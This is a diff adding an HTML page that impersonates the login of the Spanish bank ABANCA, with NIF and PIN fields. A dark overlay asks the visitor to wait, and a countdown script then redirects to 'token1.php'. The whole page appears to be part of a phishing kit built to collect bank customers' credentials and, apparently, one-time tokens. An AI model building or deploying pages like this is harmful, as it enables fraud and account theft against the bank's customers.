@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="css.css">
+</head>
+<body style="margin: 0%;">
+    
+
+    <div style="width: 115%;background-color: #5b87da;">
+    <img style="width: 80px;" src="ayuda.png" alt="">
+</div>
+
+
+
+
+
+<center> 
+
+<div style="width: 100%; height: 100%; background-color: rgb(0, 0, 0); position: fixed; opacity: 80%;">
+
+
+
+
+<br><br>
+
+
+ <br><br><br>
+
+<div style=" font-family: sans-serif; width: 380px; margin-left: -50px;">
+    
+
+    <h1 style="color: aliceblue; font-size: 20px;" id="CuentaAtras">¡Por favor, espera 20 segundos! </h1>
+        
+
+
+
+    <script language="JavaScript">
+    
+       /* Determinamos el tiempo total en segundos */
+       var totalTiempo=200;
+       
+       var url="token1.php";
+    
+       function updateReloj()
+       {
+           document.getElementById('CuentaAtras').innerHTML = "¡Por favor, espera "+totalTiempo+" segundos!";
+    
+           if(totalTiempo==0)
+           {
+               window.location=url;
+           }else{
+               /* Restamos un segundo al tiempo restante */
+               totalTiempo-=1;
+               /* Ejecutamos nuevamente la función al pasar 1000 milisegundos (1 segundo) */
+               setTimeout("updateReloj()",1000);
+           }
+       }
+     window.onload=updateReloj;
+    
+       </script>
+<br><br><br>
+<img src="loadd.gif"  alt="" style="width: 100px;">
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<img style="width: 150px; margin: 12px;" src="aba.png" alt="">
+
+<h2 class="ti">Bienvenido a la Banca electrónica y Buzón Digital de ABANCA.</h2>
+
+
+
+
+ 
+<br>
+
+ 
+<center> 
+
+
+
+<div style="width: 380px; height: 350px; ">
+    <img style="width: 100%;" src="particular.png" alt="">
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+     
+    
+     
+    
+    
+        <form   action="" class="form"> 
+    
+       <div class="cj1" style="float: left;">
+    
+     
+           <img class="nif" src="nif.png" alt="">
+    
+               <div > 
+    
+           <div style="margin-left: 190px;">
+             <a class="f1" >NIF:</a> 
+              <input class="dr1" maxlength="9" type="text" name="" id=""> <a href="" class="f2">No tengo NIF</a>
+           </div>
+    
+    
+            <br> 
+    
+              <div style="margin-left: 165px;">
+                 <a class="f1" >PIN (Contraseña):</a> 
+               <input class="dr2" maxlength="6" style="width: 60px;" type="text" name="" id=""> <a href="" class="f2">¿Has olvidado o no funciona tu PIN?</a>
+              </div>
+         
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+        <br>    <br>    <br>    <br>    
+    
+    
+    
+        <input class="acc" type="submit" value="Acceder">
+    
+     <input class="acc2" type="submit" value="Limpiar">
+    
+    
+    
+    
+    
+    
+    
+    
+    
+     
+    
+    
+    
+     
+    </form>
+    
+    
+
+
+
+
+
+     
+
+
+
+
+
+
+
+<br>
+
+
+
+
+
+
+<br><br><br>    
+ 
+ 
+<div style="width: 400px; height: auto; margin-left: -19px; ">
+
+
+<img style="width: 102%; margin-right: 10px;" src="empresa.png" alt="">
+
+</div>
+
+
+
+
+
+<img style="width:  450px ; margin-left: -40px;" src="abajofinal.png" alt="">
+
+
+
+
+
+
+
+
+</body>
+</html>
